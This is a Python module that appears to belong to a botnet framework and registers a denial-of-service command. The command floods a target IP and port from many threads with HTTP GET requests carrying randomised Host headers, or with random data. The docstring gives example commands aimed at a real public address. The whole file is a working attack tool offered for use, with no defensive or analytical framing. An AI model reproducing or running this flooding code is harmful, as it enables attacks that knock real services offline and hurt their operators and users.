import socket
import random
import logging
import threading

from .. import BotNet, Context, UserException
from ..utils import simple_serializer

_logger = logging.getLogger(f"--> {__name__}  ")


@BotNet.default_script(script_version="0.0.1")
def dos(context: Context) -> str:
    """
    Denial-Of-Service Attack.

    syntax:
        `/dos GETFlood <thread-number> <count> <ipv4> <port>`
        `/dos ACKFlood <thread-number> <count> <ipv4> <port>`

    example command:
        `/dos GETFlood 10 100 8.8.8.8 80`
        `/dos ACKFlood 10 100 8.8.8.8 80`

    GETFlood: send http GET request to target `/` route
    ACKFlood: send random data to target ip:port
    """
    command = context.command

    if len(command) == 0:
        raise UserException("dos type `None` not found")

    DOSTYPE = command[0]

    # GETFlood: send http GET request to target `/` route
    if DOSTYPE == "GETFlood":
        command, err = simple_serializer(command, [str, int, int, str, int])
        if err:
            raise UserException(err)

        THREAD_NUM = command[1]
        COUNT = command[2]
        IPV4 = command[3]
        PORT = command[4]

        if not valid_tareget_ip(IPV4, PORT):
            raise UserException(
                f"Connect to IP {IPV4} on port {PORT} failed, don't start dos"
            )
        return _start_dos(GETFlood, THREAD_NUM, [IPV4, PORT, COUNT])

    # ACKFlood: send random data to target ip:port
    elif DOSTYPE == "ACKFlood":
        command, err = simple_serializer(command, [str, int, int, str, int])
        if err:
            raise UserException(err)

        THREAD_NUM = command[1]
        COUNT = command[2]
        IPV4 = command[3]
        PORT = command[4]

        if not valid_tareget_ip(IPV4, PORT):
            raise UserException(
                f"Connect to IP {IPV4} on port {PORT} failed, don't start dos"
            )
        return _start_dos(ACKFlood, THREAD_NUM, [IPV4, PORT, COUNT])

    else:
        raise UserException(f"dos type `{DOSTYPE}` not found")


def valid_tareget_ip(IPV4: str, PORT: int) -> bool:
    """try connect to ip"""
    try:
        _logger.debug(f"Checking IP {IPV4} on port {PORT}")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((IPV4, PORT))
        s.close()
        return True

    except:
        return False


def _start_dos(target_func: callable, THREAD_NUM: int, args: list) -> str:
    for _ in range(THREAD_NUM):
        thread = threading.Thread(target=target_func, args=args)
        thread.start()
    return f"Starting Dos Attack, {target_func.__name__}"


def GETFlood(IPV4, PORT, COUNT):
    """send http GET request to target `/` route"""

    for _ in range(COUNT):
        fakeip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((IPV4, PORT))
            s.sendto((f"GET / HTTP/1.1\r\n").encode("ascii"), (IPV4, PORT))
            s.sendto((f"Host: {fakeip}\r\n\r\n").encode("ascii"), (IPV4, PORT))
            s.close()

        except:
            pass


def ACKFlood(IPV4, PORT, COUNT):
    """ACKFlood: send random data to target ip:port"""

    for _ in range(COUNT):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((IPV4, PORT))
            s.sendto((random._urandom(random.randint(50, 400))), (IPV4, PORT))
            s.close()

        except:
            pass
